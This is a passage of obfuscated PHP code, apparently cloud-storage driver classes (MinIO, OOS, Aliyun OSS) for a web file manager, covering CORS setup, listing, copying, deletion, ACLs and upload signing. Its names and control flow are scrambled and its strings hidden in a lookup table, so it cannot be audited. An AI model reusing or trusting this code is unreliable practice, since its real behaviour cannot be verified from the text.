$this->size($AèˆƒØêß); } goto DØöÒ ã; D›½î¦ì×: fseek($dàÚ‡ÈÓ«µ, $E½¨‘óÀÜª); $AÔ³¶Ûàƒ = fread($dàÚ‡ÈÓ«µ, $CÚ¼–Å¨Üó); fclose($dàÚ‡ÈÓ«µ); goto f¦Ÿ“Íõ½ğ; DØöÒ ã: if ($CÚ¼–Å¨Üó <= 0) { return $cƒ¡Ë§ï¬ñ[33]; } $dàÚ‡ÈÓ«µ = fopen($AèˆƒØêß, $cƒ¡Ë§ï¬ñ[1150]); if (!$dàÚ‡ÈÓ«µ) { return !1; } goto D›½î¦ì×; f¦Ÿ“Íõ½ğ: return $AÔ³¶Ûàƒ; goto bÑëï•Ù„; bÑëï•Ù„: } public function upload($F˜¼…´Ë É, $c¹Àš˜ÒïÊ, $Cùƒ¥ÑÕ = false, $dˆç‰¥é³ = REPEAT_REPLACE) { $D‚šë›¸© = $this->copyFile($c¹Àš˜ÒïÊ, $F˜¼…´Ë É); return $D‚šë›¸© ? $this->getPathOuter($F˜¼…´Ë É) : !1; } public function download($e÷­ÂùÕ×÷, $f‘İ‰®ëÂ¨) { return $this->iconvSystem($e÷­ÂùÕ×÷); } } goto CË‡á¤Ê¿Ş; CË‡á¤Ê¿Ş: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DÒ´ˆ•’…×) { parent::__construct($DÒ´ˆ•’…×); $this->signatureVersion($_SERVER[»„][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($a¥¦ÜÈÉçÓ) { parent::__construct($a¥¦ÜÈÉçÓ); $this->signatureVersion($_SERVER[»„][196]); } public function fileOutLink($CŞÃ°“â¶é) { $d¹¼¯³È¾ =& $_SERVER[»„]; if (substr($CŞÃ°“â¶é, 0, 7) == $d¹¼¯³È¾[1096]) { $CŞÃ°“â¶é = $d¹¼¯³È¾[1097] . substr($CŞÃ°“â¶é, 7); } header($d¹¼¯³È¾[152] . $CŞÃ°“â¶é); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($d‹Ñù´—¾) { parent::__construct(); include_once SDK_DIR . $_SERVER[»„][1151]; $this->_init($d‹Ñù´—¾); } public function _init($B—µ¨’Âğ) { foreach ($B—µ¨’Âğ as $aÚß¾í‹Ò => $B—ªë¨«„¿) { if (isset($this->{$aÚß¾í‹Ò})) { $this->{$aÚß¾í‹Ò} = $B—ªë¨«„¿; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[»„][1152], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto D³¹®²šÕ; FİÑÆê‹ÆĞ: $aå„­Î©ªĞ->addAllowedOrigin($AË˜÷ã«ç…[1153]); $aå„­Î©ªĞ->addAllowedMethod($AË˜÷ã«ç…[1154]); $aå„­Î©ªĞ->addAllowedMethod($AË˜÷ã«ç…[1155]); goto d•ù“ÄÌ¬°; DÇÑ±¨®†: $aå„­Î©ªĞ->setMaxAgeSeconds(600); $aå„­Î©ªĞ->addExposeHeader($AË˜÷ã«ç…[1158]); $aå„­Î©ªĞ->addAllowedHeader($AË˜÷ã«ç…[1153]); goto bÍõ‰Ï‹®Ú; d•ù“ÄÌ¬°: $aå„­Î©ªĞ->addAllowedMethod($AË˜÷ã«ç…[1156]); $aå„­Î©ªĞ->addAllowedMethod($AË˜÷ã«ç…[1157]); $aå„­Î©ªĞ->addAllowedMethod($AË˜÷ã«ç…[151]); goto DÇÑ±¨®†; bÍõ‰Ï‹®Ú: $f¾­ÑÜß->addRule($aå„­Î©ªĞ); try { $this->client->putBucketCors($this->bucket, $f¾­ÑÜß); } catch (OSS\Core\OssException $b¶Š¨èÒ®Ó) { return !1; } return !0; goto C´“ò¶˜•Á; D³¹®²šÕ: $AË˜÷ã«ç… =& $_SERVER[»„]; $f¾­ÑÜß = new OSS\Model\CorsConfig(); $aå„­Î©ªĞ = new OSS\Model\CorsRule(); goto FİÑÆê‹ÆĞ; C´“ò¶˜•Á: } public function getBucketCors() { goto A×æÂµ‡é†; A×æÂµ‡é†: $aìõ¶íÒ¡« =& $_SERVER[»„]; $cõÊğÁ“¤ = null; try { $cõÊğÁ“¤ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Cåé««÷˜Ş) { return null; } goto D““¹‡Š‘Ø; D““¹‡Š‘Ø: if (!$cõÊğÁ“¤ || !($fŞèÜİ­¾Œ = $cõÊğÁ“¤->getRules())) { return null; } $aÊŸî¥É±Ñ = $fŞèÜİ­¾Œ[0]->getAllowedOrigins(); $aé•×ãùÙô = $fŞèÜİ­¾Œ[0]->getAllowedMethods(); goto bª—Å¯ø©Õ; F¨©à×ØèÒ: return array($aìõ¶íÒ¡«[171] => isset($aÊŸî¥É±Ñ[0]) ? $aÊŸî¥É±Ñ[0] : $aìõ¶íÒ¡«[33], $aìõ¶íÒ¡«[175] => $aé•×ãùÙô, $aìõ¶íÒ¡«[1159] => $fÇòæ¤’‚Ô, $aìõ¶íÒ¡«[1160] => isset($EÄñÄ¶¢å´[0]) ? $EÄñÄ¶¢å´[0] : $aìõ¶íÒ¡«[33], $aìõ¶íÒ¡«[173] => isset($a£•Âä–ªã[0]) ? $a£•Âä–ªã[0] : $aìõ¶íÒ¡«[33]); goto fª…£¼Øšƒ; bª—Å¯ø©Õ: $fÇòæ¤’‚Ô = $fŞèÜİ­¾Œ[0]->getMaxAgeSeconds(); $EÄñÄ¶¢å´ = $fŞèÜİ­¾Œ[0]->getExposeHeaders(); $a£•Âä–ªã = $fŞèÜİ­¾Œ[0]->getAllowedHeaders(); goto F¨©à×ØèÒ; fª…£¼Øšƒ: } public function isBucketCors() { goto D›ƒº«Íà; eÉ³“¤Ø±¨: if ($E’æ“²¥Ÿò[$FÈ ¯Å´ÜÆ[171]] != $FÈ ¯Å´ÜÆ[172] || $E’æ“²¥Ÿò[$FÈ ¯Å´ÜÆ[173]] != $FÈ ¯Å´ÜÆ[172]) { return !1; } $dçº‹£áÑØ = array_map($FÈ ¯Å´ÜÆ[174], $E’æ“²¥Ÿò[$FÈ ¯Å´ÜÆ[175]]); if (!is_array($dçº‹£áÑØ)) { $dçº‹£áÑØ = array(); } goto cÛµËç¿; D›ƒº«Íà: $FÈ ¯Å´ÜÆ =& $_SERVER[»„]; $E’æ“²¥Ÿò = $this->getBucketCors(); if (!$E’æ“²¥Ÿò || !is_array($E’æ“²¥Ÿò)) { return !1; } goto eÉ³“¤Ø±¨; cÛµËç¿: $f‰¬åŸ°¥« = array($FÈ ¯Å´ÜÆ[176], $FÈ ¯Å´ÜÆ[177], $FÈ ¯Å´ÜÆ[178], $FÈ ¯Å´ÜÆ[179], $FÈ ¯Å´ÜÆ[180]); $A¤†ÎÁùµ = array_diff($f‰¬åŸ°¥«, $dçº‹£áÑØ); return empty($A¤†ÎÁùµ); goto FµˆƒÎÓ¨„; FµˆƒÎÓ¨„: } public function mkfile($EŒ–÷ğŞëÑ, $E÷Ö½ï³ = '', $f¼‚ã¼±‡ = REPEAT_RENAME) { $a¹¶Å©Éù = $this->setContent($EŒ–÷ğŞëÑ, $E÷Ö½ï³); if ($a¹¶Å©Éù !== !1) { return $this->getPathOuter($EŒ–÷ğŞëÑ); } return !1; } public function mkdir($ağÉ¯ç¿Ä†, $eèÂ¹òË‰å = REPEAT_SKIP) { if ($this->_isFolder($ağÉ¯ç¿Ä†)) { return $this->getPathOuter($ağÉ¯ç¿Ä†); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ağÉ¯ç¿Ä†)); } catch (OSS\Core\OssException $A„ˆ¤ˆ²›ø) { return !1; } return $this->getPathOuter($ağÉ¯ç¿Ä†); } private function fileList($D¨¡šÀƒŠ, $cåŠ¢â„Ú = '', $cŸ÷‚µÊò = 0) { goto A‡´é¸ìä«; FÄÅÅˆ¸‡Ä: while (!0) { $BŸ–÷´Ö›ä = array($Déà…“‰«¤[1161] => $cåŠ¢â„Ú, $Déà…“‰«¤[182] => $D‡àæ†’Ÿ, $Déà…“‰«¤[1162] => $a®²ê¿ˆ„ò, $Déà…“‰«¤[1163] => $f‹¹”ñŒ¸¥); try { $c©‚èğâ•ˆ = $this->client->listObjects($this->bucket, $BŸ–÷´Ö›ä); } catch (OSS\Core\OssException $e”„´À­Ş‘) { break; } $f‹¹”ñŒ¸¥ = $c©‚èğâ•ˆ->getNextMarker(); $B˜±“¦»¹ = $c©‚èğâ•ˆ->getObjectList(); $cïõù†ºù = $c©‚èğâ•ˆ->getPrefixList(); foreach ($B˜±“¦»¹ as $a˜¶‰óæ•®) { if ($a˜¶‰óæ•®->getKey() == $D‡àæ†’Ÿ) { continue; } $FĞæ³ñ¢ä· = $a˜¶‰óæ•®->getKey(); if ($cŸ÷‚µÊò) { $FĞæ³ñ¢ä· = array($Déà…“‰«¤[28] => $FĞæ³ñ¢ä·, $Déà…“‰«¤[77] => $a˜¶‰óæ•®->getSize(), $Déà…“‰«¤[186] => strtotime($a˜¶‰óæ•®->getLastModified())); } $e»Ø¸º‚ [] = $FĞæ³ñ¢ä·; } foreach ($cïõù†ºù as $BÇµîÇ’¬) { $DÕªªé‚²Ö[] = $BÇµîÇ’¬->getPrefix(); } if ($f‹¹”ñŒ¸¥ === $Déà…“‰«¤[33]) { break; } } return array($Déà…“‰«¤[74] => $DÕªªé‚²Ö, $Déà…“‰«¤[73] => $e»Ø¸º‚ ); goto cÒŞöÖ£Ç²; aƒ¶è…Ìœ: $f‹¹”ñŒ¸¥ = $Déà…“‰«¤[33]; $a®²ê¿ˆ„ò = 1000; $DÕªªé‚²Ö = $e»Ø¸º‚  = array(); goto FÄÅÅˆ¸‡Ä; A‡´é¸ìä«: $Déà…“‰«¤ =& $_SERVER[»„]; $D¨¡šÀƒŠ = trim($D¨¡šÀƒŠ, $Déà…“‰«¤[8]); $D‡àæ†’Ÿ = empty($D¨¡šÀƒŠ) ? $Déà…“‰«¤[33] : $D¨¡šÀƒŠ . $Déà…“‰«¤[8]; goto aƒ¶è…Ìœ; cÒŞöÖ£Ç²: } public function copyFile($aÒÍŞøÀ‹÷, $BÜĞ™Ä³–¬) { $AŒÔ°ƒš¨Ë = $this->size($aÒÍŞøÀ‹÷); if ($AŒÔ°ƒš¨Ë < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $aÒÍŞøÀ‹÷, $this->bucket, $this->pathEncode($BÜĞ™Ä³–¬)); } catch (OSS\Core\OssException $fŸ»¤°Òîœ) { return !1; } return !0; } return $this->multiCopyObject($aÒÍŞøÀ‹÷, $BÜĞ™Ä³–¬, $AŒÔ°ƒš¨Ë); } private function multiCopyObject($fÉò¦ç…Œ , $E³çùíöíÉ, $BÌäâ±»œÒ) { $BÛÍĞ·‚î =& $_SERVER[»„]; try { goto dĞİ±¤Èº¦; FäÀ­•Ñ: $dÚ×²œ‰íİ = 1; $Bº‘ßŞé…ç = 0; $F÷ì¤»… = array(); goto DñÁ¹îß¯İ; fÎèÚâŒ–ï: $eÀ®œ—Ê½ù = array(); foreach ($F÷ì¤»… as $E‹ƒÖÀÈË¤ => $C™áñŞ¾Šå) { $eÀ®œ—Ê½ù[] = array($BÛÍĞ·‚î[1168] => $E‹ƒÖÀÈË¤ + 1, $BÛÍĞ·‚î[1169] => $C™áñŞ¾Šå); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($E³çùíöíÉ), $CÍá¯˜™â®, $eÀ®œ—Ê½ù); goto Bœ’ÕÛË‚´; dĞİ±¤Èº¦: $AàÉ¼­†„ª = array(); if ($F’Ö‚â£¥ = $this->hashMd5($fÉò¦ç…Œ )) { $AàÉ¼­†„ª = array(OSS\OssClient::OSS_HEADERS => array($BÛÍĞ·‚î[1164] => $F’Ö‚â£¥)); } $CÍá¯˜™â® = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($E³çùíöíÉ), $AàÉ¼­†„ª); goto FäÀ­•Ñ; DñÁ¹îß¯İ: $B‰ÅèÒ²›¿ = 1024 * 1024 * 10; $A¬çºÍ = $this->client->generateMultiuploadParts($BÌäâ±»œÒ, $B‰ÅèÒ²›¿); foreach ($A¬çºÍ as $E‹ƒÖÀÈË¤ => $béƒª°×â²) { $BØ²…§ØÎ = $Bº‘ßŞé…ç + (int) $béƒª°×â²[$BÛÍĞ·‚î[1165]]; $e÷«¿„è®¶ = (int) $béƒª°×â²[$BÛÍĞ·‚î[321]] + $BØ²…§ØÎ - 1; $eÌœö½¹ŠÄ = array($BÛÍĞ·‚î[1166] => $BØ²…§ØÎ, $BÛÍĞ·‚î[1167] => $e÷«¿„è®¶); $F÷ì¤»…[] = $this->client->uploadPartCopy($this->bucket, $fÉò¦ç…Œ , $this->bucket, $this->pathEncode($E³çùíöíÉ), $dÚ×²œ‰íİ, $CÍá¯˜™â®, $eÌœö½¹ŠÄ); $dÚ×²œ‰íİ = $dÚ×²œ‰íİ + 1; } goto fÎèÚâŒ–ï; Bœ’ÕÛË‚´: } catch (OSS\Core\OssException $F¥í‚’ƒ®¬) { return !1; } return !0; } public function moveFile($eÀ£¥¡í™£, $b—Ñ¶İ×øš) { if ($this->copyFile($eÀ£¥¡í™£, $b—Ñ¶İ×øš)) { $this->remove($eÀ£¥¡í™£); return !0; } return !1; } public function delFile($bÙ¤İ†ôÌ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($bÙ¤İ†ôÌ)); } catch (OSS\Core\OssException $dŸÓÙ¢™¿´) { return !1; } return !0; } public function delFolder($a¼Ó‚´”ô‘) { $Eß¦Ç‡­æö =& $_SERVER[»„]; $Aå¼¤ÛÍ˜ª = $this->fileList($a¼Ó‚´”ô‘); if (!empty($a¼Ó‚´”ô‘) && !in_array(trim($a¼Ó‚´”ô‘, $Eß¦Ç‡­æö[8]) . $Eß¦Ç‡­æö[8], $Aå¼¤ÛÍ˜ª[$Eß¦Ç‡­æö[73]])) { $Aå¼¤ÛÍ˜ª[$Eß¦Ç‡­æö[73]][] = trim($a¼Ó‚´”ô‘, $Eß¦Ç‡­æö[8]) . $Eß¦Ç‡­æö[8]; } foreach (array_chunk($Aå¼¤ÛÍ˜ª[$Eß¦Ç‡­æö[73]], 1000) as $Cº¥›‚ÓÕ) { try { $this->client->deleteObjects($this->bucket, $Cº¥›‚ÓÕ); } catch (OSS\Core\OssException $eóŒÂâÕÆ) { continue; } } return !0; } public function rename($eÈãä’³…, $F‰íÄôŠšš) { return $this->renameObject($eÈãä’³…, $F‰íÄôŠšš); } private function fileInfo($AõÎİ‰ã‡§, $D¾İŞíŒ = array()) { goto aï•æ–ÅÜä; cğÙÈ°ÆßŠ: return $dï‡‘‡›¨Â; goto d‚ÜâÈƒæ÷; aï•æ–ÅÜä: $d¦Ô…¦‚ê =& $_SERVER[»„]; $dï‡‘‡›¨Â = array($d¦Ô…¦‚ê[28] => $this->pathThis($AõÎİ‰ã‡§), $d¦Ô…¦‚ê[75] => $this->getPathOuter($AõÎİ‰ã‡§), $d¦Ô…¦‚ê[29] => $d¦Ô…¦‚ê[163], $d¦Ô…¦‚ê[183] => 0, $d¦Ô…¦‚ê[106] => 0, $d¦Ô…¦‚ê[77] => 0, $d¦Ô…¦‚ê[156] => $this->ext($AõÎİ‰ã‡§), $d¦Ô…¦‚ê[184] => !0, $d¦Ô…¦‚ê[185] => !0); if (empty($D¾İŞíŒ)) { $fç¨áéÔçŒ = $this->objectMeta($AõÎİ‰ã‡§); if (!$fç¨áéÔçŒ) { return $dï‡‘‡›¨Â; } $D¾İŞíŒ = array($d¦Ô…¦‚ê[106] => strtotime($fç¨áéÔçŒ[$d¦Ô…¦‚ê[1170]]), $d¦Ô…¦‚ê[77] => $fç¨áéÔçŒ[$d¦Ô…¦‚ê[1171]] + 0); } goto dÙÚïÑòŸî; dÙÚïÑòŸî: if (isset($D¾İŞíŒ[$d¦Ô…¦‚ê[77]])) { $dï‡‘‡›¨Â[$d¦Ô…¦‚ê[77]] = $D¾İŞíŒ[$d¦Ô…¦‚ê[77]]; } if (isset($D¾İŞíŒ[$d¦Ô…¦‚ê[106]])) { $dï‡‘‡›¨Â[$d¦Ô…¦‚ê[106]] = $D¾İŞíŒ[$d¦Ô…¦‚ê[106]]; } if (isset($D¾İŞíŒ[$d¦Ô…¦‚ê[186]]) && !trim($dï‡‘‡›¨Â[$d¦Ô…¦‚ê[106]])) { $dï‡‘‡›¨Â[$d¦Ô…¦‚ê[106]] = $D¾İŞíŒ[$d¦Ô…¦‚ê[186]]; } goto cğÙÈ°ÆßŠ; d‚ÜâÈƒæ÷: } private function folderInfo($CâÙÓ¤ô¦Ó, $DòŸ¯áÙ¬– = array()) { $eæƒİ‚÷ =& $_SERVER[»„]; $cÏ„Ğã“Äî = array($eæƒİ‚÷[28] => $this->pathThis($CâÙÓ¤ô¦Ó), $eæƒİ‚÷[75] => $this->getPathOuter($eæƒİ‚÷[8] . $CâÙÓ¤ô¦Ó), $eæƒİ‚÷[29] => $eæƒİ‚÷[76], $eæƒİ‚÷[183] => 0, $eæƒİ‚÷[106] => 0, $eæƒİ‚÷[184] => !0, $eæƒİ‚÷[185] => !0); if (empty($DòŸ¯áÙ¬–)) { $CâÙÓ¤ô¦Ó = rtrim($CâÙÓ¤ô¦Ó, $eæƒİ‚÷[8]) . $eæƒİ‚÷[8]; $b…°˜½“ƒÏ = $this->objectMeta($CâÙÓ¤ô¦Ó); if (!$b…°˜½“ƒÏ) { return $cÏ„Ğã“Äî; } $DòŸ¯áÙ¬– = array($eæƒİ‚÷[183] => $b…°˜½“ƒÏ[$eæƒİ‚÷[1172]][$eæƒİ‚÷[1173]], $eæƒİ‚÷[106] => strtotime($b…°˜½“ƒÏ[$eæƒİ‚÷[1170]])); } if (isset($DòŸ¯áÙ¬–[$eæƒİ‚÷[106]])) { $cÏ„Ğã“Äî[$eæƒİ‚÷[106]] = $DòŸ¯áÙ¬–[$eæƒİ‚÷[106]]; } if (isset($DòŸ¯áÙ¬–[$eæƒİ‚÷[183]])) { $cÏ„Ğã“Äî[$eæƒİ‚÷[183]] = $DòŸ¯áÙ¬–[$eæƒİ‚÷[183]]; } return $cÏ„Ğã“Äî; } public function listPath($BßÊ×‘¹ğÊ, $c§ñÒº¢éé = false) { $Dµ™›ôøÁ… =& $_SERVER[»„]; $E°ÑŞ†®éğ = $this->fileList($BßÊ×‘¹ğÊ, $Dµ™›ôøÁ…[8], !0); foreach ($E°ÑŞ†®éğ[$Dµ™›ôøÁ…[74]] as $A†„øç×Æ¶ => $d±¥Ôî„È) { $E°ÑŞ†®éğ[$Dµ™›ôøÁ…[74]][$A†„øç×Æ¶] = $this->folderInfo($d±¥Ôî„È, $d±¥Ôî„È); } foreach ($E°ÑŞ†®éğ[$Dµ™›ôøÁ…[73]] as $A†„øç×Æ¶ => $d±¥Ôî„È) { $E°ÑŞ†®éğ[$Dµ™›ôøÁ…[73]][$A†„øç×Æ¶] = $this->fileInfo($d±¥Ôî„È[$Dµ™›ôøÁ…[28]], $d±¥Ôî„È); } return $E°ÑŞ†®éğ; } public function has($DØò§¬‹‚µ, $cì–‡éÄîô = false, $b¦çï­Óƒš = true) { goto dùôùàÅ¾Ğ; d«¦ˆšÒ‚: return !1; goto Eèà°’†Œá; a—Âêñò®«: $dÙ©Ì¨Õğ = 0; while (!0) { $eÑ¹˜÷ˆ¤æ = array($FÜÅ¬›™º·[1161] => $FÜÅ¬›™º·[8], $FÜÅ¬›™º·[182] => $C”ëâœöœÎ, $FÜÅ¬›™º·[1162] => $B«²ïÈº, $FÜÅ¬›™º·[1163] => $D¹ÀßÉÔˆ); try { $bñÄø Æñ— = $this->client->listObjects($this->bucket, $eÑ¹˜÷ˆ¤æ); } catch (OSS\Core\OssException $b‡Š­¹…„‚) { break; } $D¹ÀßÉÔˆ = $bñÄø Æñ—->getNextMarker(); $a‡¤óË¸ˆ = $bñÄø Æñ—->getObjectList(); $aõ´Æâ‚ = $bñÄø Æñ—->getPrefixList(); if ($cì–‡éÄîô) { if (count($a‡¤óË¸ˆ) > 1 || count($a‡¤óË¸ˆ) == 1 && $a‡¤óË¸ˆ[0]->getKey() != $C”ëâœöœÎ) { $bÙÙŒ¢ñ += count($a‡¤óË¸ˆ) - 1; } if (!empty($aõ´Æâ‚)) { $dÙ©Ì¨Õğ += count($aõ´Æâ‚); } if ($D¹ÀßÉÔˆ === $FÜÅ¬›™º·[33]) { break; } continue; } if ($b¦çï­Óƒš) { if (!empty($a‡¤óË¸ˆ)) { if (count($a‡¤óË¸ˆ) > 1 || $a‡¤óË¸ˆ[0]->getKey() != $C”ëâœöœÎ) { return !0; } } } else { if (!empty($aõ´Æâ‚)) { return !0; } } if ($D¹ÀßÉÔˆ === $FÜÅ¬›™º·[33]) { break; } } if ($cì–‡éÄîô) { return array($FÜÅ¬›™º·[187] => $bÙÙŒ¢ñ, $FÜÅ¬›™º·[188] => $dÙ©Ì¨Õğ); } goto d«¦ˆšÒ‚; dùôùàÅ¾Ğ: $FÜÅ¬›™º· =& $_SERVER[»„]; $DØò§¬‹‚µ = trim($DØò§¬‹‚µ, $FÜÅ¬›™º·[8]); $C”ëâœöœÎ = empty($DØò§¬‹‚µ) ? $FÜÅ¬›™º·[33] : $DØò§¬‹‚µ . $FÜÅ¬›™º·[8]; goto EÅîò†ƒ´«; EÅîò†ƒ´«: $D¹ÀßÉÔˆ = $FÜÅ¬›™º·[33]; $B«²ïÈº = 500; $bÙÙŒ¢ñ = 0; goto a—Âêñò®«; Eèà°’†Œá: } public function listAll($A¸Ä¬˜ÙÛ) { $cÙèŸ…ÀÎÈ =& $_SERVER[»„]; $dŸÓÄ¦ = $this->fileList($A¸Ä¬˜ÙÛ, $cÙèŸ…ÀÎÈ[33], !0); $Cº¹ğÍ«Ê = array(); foreach ($dŸÓÄ¦[$cÙèŸ…ÀÎÈ[73]] as $b§Á°ÇÉ¦) { $Cº¹ğÍ«Ê[$b§Á°ÇÉ¦[$cÙèŸ…ÀÎÈ[28]]] = $b§Á°ÇÉ¦[$cÙèŸ…ÀÎÈ[77]]; } return $this->listAllFiles($A¸Ä¬˜ÙÛ, array_keys($Cº¹ğÍ«Ê), $Cº¹ğÍ«Ê); } public function canRead($Bé¯»¶ÉæĞ) { $fù¦‡Öª =& $_SERVER[»„]; $Fªèåí‚­‘ = $this->pathAcl($Bé¯»¶ÉæĞ); return $Fªèåí‚­‘ == $fù¦‡Öª[1174] || $Fªèåí‚­‘ == $fù¦‡Öª[487] ? !0 : !1; } public function canWrite($e¹©ˆº½®à) { $fÏ‚ÛÖ‡Ş³ = $this->pathAcl($e¹©ˆº½®à); return $fÏ‚ÛÖ‡Ş³ == $_SERVER[»„][487] ? !0 : !1; } public function pathAcl($FÉâÌù¨±Ô) { goto Aæ²«ñøœ; fÛ™©Æ‰Ã­: $Eáãçö’Ü¿ = $fèÀÈêÏ == $b¬Ÿ¸Ã‚Šİ[34] ? $this->bucketAcl : $fèÀÈêÏ; if ($Eáãçö’Ü¿ == $b¬Ÿ¸Ã‚Šİ[1175]) { return $b¬Ÿ¸Ã‚Šİ[1174]; } if ($Eáãçö’Ü¿ == $b¬Ÿ¸Ã‚Šİ[1176]) { return $b¬Ÿ¸Ã‚Šİ[487]; } goto d†»‘ô²ÂŠ; d†»‘ô²ÂŠ: return $Eáãçö’Ü¿; goto F‡®å¹¹Ç·; Aæ²«ñøœ: $b¬Ÿ¸Ã‚Šİ =& $_SERVER[»„]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $fèÀÈêÏ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($FÉâÌù¨±Ô)); } catch (OSS\Core\OssException $Bä²àŒµë­) { return !1; } goto fÛ™©Æ‰Ã­; F‡®å¹¹Ç·: } private function chmodPath($eŞ÷¡¼‘£, $fôÍßëß‹¬ = '') { $e¤—ø‘ËˆÜ =& $_SERVER[»„]; $B·‰Á¥İ‘ = empty($fôÍßëß‹¬) ? $e¤—ø‘ËˆÜ[1176] : $fôÍßëß‹¬; $bíŒÒ¨É§¥ = array($e¤—ø‘ËˆÜ[34], $e¤—ø‘ËˆÜ[181], $e¤—ø‘ËˆÜ[1175], $e¤—ø‘ËˆÜ[1176]); if (!in_array($B·‰Á¥İ‘, $bíŒÒ¨É§¥)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($eŞ÷¡¼‘£), $B·‰Á¥İ‘); } catch (OSS\Core\OssException $D¼Î™Àñ¡ ) { return !1; } return !0; } public function getContent($cøÙğ•òÂ) { return $this->fileSubstr($cøÙğ•òÂ, -1); } public function setContent($FÛŒù±Úñ°, $eÙ¶òö–ÇÄ = '') { $fÜÁ§±êËË =& $_SERVER[»„]; try { $føœ÷£±’‹ = $this->trafficLimit($fÜÁ§±êËË[1177]); $bˆ›Ä’ÔÌ¾ = $this->client->putObject($this->bucket, $this->pathEncode($FÛŒù±Úñ°), $eÙ¶òö–ÇÄ, $føœ÷£±’‹); } catch (OSS\Core\OssException $dëïßƒ‡Ï) { return !1; } $E™““ãÏº³ = array($fÜÁ§±êËË[1164] => trim($bˆ›Ä’ÔÌ¾[$fÜÁ§±êËË[1178]], $fÜÁ§±êËË[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($FÛŒù±Úñ°))); $this->updateObjMeta($FÛŒù±Úñ°, $E™““ãÏº³); return isset($bˆ›Ä’ÔÌ¾[$fÜÁ§±êËË[1179]][$fÜÁ§±êËË[1126]]) ? (int) $bˆ›Ä’ÔÌ¾[$fÜÁ§±êËË[1179]][$fÜÁ§±êËË[1126]] : strlen($bˆ›Ä’ÔÌ¾); } private function updateObjMeta($bò£Š¬™é¹, $Eà£…’Ç£) { $bò£Š¬™é¹ = $this->pathEncode($bò£Š¬™é¹); try { $c‡»–‘æéï = array(OSS\OssClient::OSS_HEADERS => $Eà£…’Ç£); $this->client->copyObject($this->bucket, $bò£Š¬™é¹, $this->bucket, $bò£Š¬™é¹, $c‡»–‘æéï); } catch (OSS\Core\OssException $A…İÖ‘Éì÷) { return !1; } return !0; } public function upload($b¨Ïä‰ˆ¦, $FÑÏé±Ù÷°, $f¥Ê“‡Àêï = false, $D”’÷©ì…¦ = REPEAT_REPLACE) { $dá½‰±¦Ïø =& $_SERVER[»„]; $b©»Ìë¥ƒ‚ = trim($b¨Ïä‰ˆ¦, $dá½‰±¦Ïø[8]); $a­¶¡µÏÓ‚ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($dá½‰±¦Ïø[1164] => @md5_file($FÑÏé±Ù÷°)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b¨Ïä‰ˆ¦))); $a­¶¡µÏÓ‚ = $this->trafficLimit($dá½‰±¦Ïø[1177], $a­¶¡µÏÓ‚); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($b©»Ìë¥ƒ‚), $FÑÏé±Ù÷°, $a­¶¡µÏÓ‚); } catch (OSS\Core\OssException $f±¹ã³ƒŒÁ) { return !1; } return $this->getPathOuter($b¨Ïä‰ˆ¦); } public function getHost() { $CÏóÄİö÷ì =& $_SERVER[»„]; $aª²”æª×Ù = explode($CÏóÄİö÷ì[167], parent::getHost()); return $aª²”æª×Ù[0] . $CÏóÄİö÷ì[167] . $this->bucket . $CÏóÄİö÷ì[91] . $aª²”æª×Ù[1]; } public function uploadFormData($B½‡«Ëµ•É, $Cã«¾“°Ûƒ = 3600) { goto FøÚºù¡‡ì; Cë¾·°ãÙ†: return $Aø®Ú¾£³ñ; goto C×à÷»¹Ø½; FÀÏ´‹›½Õ: $e‚Ì¿Ÿù¿ = $this->pathFather($B½‡«Ëµ•É); $E°„ö”ˆ°˜ = array($AÖÄ‡Ò°ÅŞ[1083] => $A è¤å… è, $AÖÄ‡Ò°ÅŞ[1084] => array(array($AÖÄ‡Ò°ÅŞ[1182], 0, $Dñô…×Ô†ù), array($AÖÄ‡Ò°ÅŞ[1087], $AÖÄ‡Ò°ÅŞ[1088], $e‚Ì¿Ÿù¿))); $bˆÒåÍÑ = base64_encode(json_encode($E°„ö”ˆ°˜)); goto d°õğèàšä; d°õğèàšä: $BÔá†‡‰šÁ = base64_encode(hash_hmac($AÖÄ‡Ò°ÅŞ[214], $bˆÒåÍÑ, $this->secret, !0)); $Aø®Ú¾£³ñ = array($AÖÄ‡Ò°ÅŞ[1093] => $bˆÒåÍÑ, $AÖÄ‡Ò°ÅŞ[1183] => $this->accessKey, $AÖÄ‡Ò°ÅŞ[1089] => $AÖÄ‡Ò°ÅŞ[1081], $AÖÄ‡Ò°ÅŞ[1184] => $BÔá†‡‰šÁ, $AÖÄ‡Ò°ÅŞ[165] => $DÖá¤ËÖù©); $Aø®Ú¾£³ñ = $this->trafficLimit($AÖÄ‡Ò°ÅŞ[1177], $Aø®Ú¾£³ñ); goto Cë¾·°ãÙ†; FøÚºù¡‡ì: $AÖÄ‡Ò°ÅŞ =& $_SERVER[»„]; if (!($DÖá¤ËÖù© = $this->getHost())) { return !1; } $bÉ‘ãœ˜ = $Cã«¾“°Ûƒ; goto EäÏÖ¾Î¶…; e£¾Æ°„šù: $A±å»¬ùé§ = strpos($A è¤å… è, $AÖÄ‡Ò°ÅŞ[280]); $A è¤å… è = substr($A è¤å… è, 0, $A±å»¬ùé§) . 